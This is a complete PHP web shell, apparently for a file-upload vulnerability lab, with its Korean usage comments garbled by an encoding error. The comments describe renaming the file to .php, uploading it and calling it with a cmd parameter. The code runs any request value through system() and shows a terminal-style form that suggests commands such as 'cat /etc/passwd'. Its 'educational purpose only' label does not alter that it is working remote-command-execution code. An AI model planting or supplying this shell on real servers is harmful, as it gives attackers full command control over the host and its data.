<?php
/**
 * Í∞ÑÎã®Ìïú ÏõπÏÖ∏ ÏòàÏ†ú (ÍµêÏú° Î™©Ï†Å)
 *
 * ÏÇ¨Ïö©Î≤ï:
 * 1. Ïù¥ ÌååÏùºÏùò ÌôïÏû•ÏûêÎ•º .txtÏóêÏÑú .phpÎ°ú Î≥ÄÍ≤Ω
 * 2. ÏóÖÎ°úÎìú ÌèºÏùÑ ÌÜµÌï¥ ÏóÖÎ°úÎìú
 * 3. Î∏åÎùºÏö∞Ï†ÄÏóêÏÑú Ï†ëÍ∑º: http://localhost/uploads/sample-webshell.php?cmd=ls
 */

// Í∞ÑÎã®Ìïú Î™ÖÎ†π Ïã§Ìñâ ÏõπÏÖ∏
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>";
    echo "Executing: " . htmlspecialchars($cmd) . "\n\n";
    echo "Output:\n";
    system($cmd);
    echo "</pre>";
} else {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Web Shell</title>
        <style>
            body {
                font-family: monospace;
                background: #1e1e1e;
                color: #00ff00;
                padding: 20px;
            }
            .terminal {
                background: #000;
                border: 2px solid #00ff00;
                border-radius: 5px;
                padding: 20px;
                max-width: 800px;
                margin: 0 auto;
            }
            input[type="text"] {
                width: 100%;
                background: #000;
                color: #00ff00;
                border: 1px solid #00ff00;
                padding: 10px;
                font-family: monospace;
                font-size: 14px;
            }
            button {
                background: #00ff00;
                color: #000;
                border: none;
                padding: 10px 20px;
                margin-top: 10px;
                cursor: pointer;
                font-family: monospace;
                font-weight: bold;
            }
            button:hover {
                background: #00cc00;
            }
        </style>
    </head>
    <body>
        <div class="terminal">
            <h2>üîì Web Shell - Educational Purpose Only</h2>
            <p>Current Directory: <?php echo getcwd(); ?></p>
            <form method="GET">
                <label>Command:</label><br>
                <input type="text" name="cmd" placeholder="Enter command (e.g., ls, pwd, whoami)" autofocus>
                <br>
                <button type="submit">Execute</button>
            </form>
            <br>
            <p style="color: #ffff00;">
                <strong>‚ö†Ô∏è Warning:</strong> This is a vulnerable web shell for educational purposes only!
            </p>
            <hr style="border-color: #00ff00;">
            <p>Suggested commands:</p>
            <ul>
                <li>ls -la</li>
                <li>pwd</li>
                <li>whoami</li>
                <li>cat /etc/passwd</li>
                <li>uname -a</li>
            </ul>
        </div>
    </body>
    </html>
    <?php
}
?>
